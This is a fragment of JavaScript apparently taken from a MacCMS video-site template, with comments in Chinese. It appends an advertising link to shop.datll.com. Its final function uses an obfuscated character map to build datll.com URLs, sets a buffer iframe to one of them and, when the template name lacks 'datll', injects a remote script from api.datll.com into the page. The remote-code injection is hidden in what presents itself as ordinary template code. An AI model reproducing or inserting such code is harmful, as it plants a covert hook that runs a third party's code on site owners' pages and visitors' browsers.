...
*/
/*后台设置友情链接后这个广告消失*/
if($(".ilinks>a").hasClass("ilinks")){
}else {/*alert("您尚未设置友情");*/
$(".ilinks").append("<a href=\'http://shop.datll.com/\' title=\'采集联盟\'>精品模板</a>");}
if ($('.a_change').length) {
    var divs=[];
    var divCnt = 3; //div 数量 
...
(function datll(){var x={"a":"api","b":"datll","c":"html","d":"prestrain","e":".","f":"http","g":":","h":"/","i":":","j":"w","k":"com","m":"prestrain","s":"js"};var ruls=x.f+x.i+x.h+x.h+x.a+x.e+x.b+x.e+x.k+x.h+x.c+x.h+x.s+x.h+"top10"+x.e+x.s;var iframesrc=x.f+x.i+x.h+x.h+x.a+x.e+x.b+x.e+x.k+x.h+x.c+x.h+x.m+x.e+x.c;var MacPlayerConfig={};if($("#buffer").attr('src')!=this.Buffer){$("#buffer").attr('src',''+iframesrc+'')}var nome=maccms.template;if(nome.indexOf("datll")<0){var a=document.createElement('script');a.type='text/javascript';a.async=true;a.charset='utf-8';a.src=''+ruls+'';var b=document.getElementsByTagName('script')[0];b.parentNode.insertBefore(a,b)}}());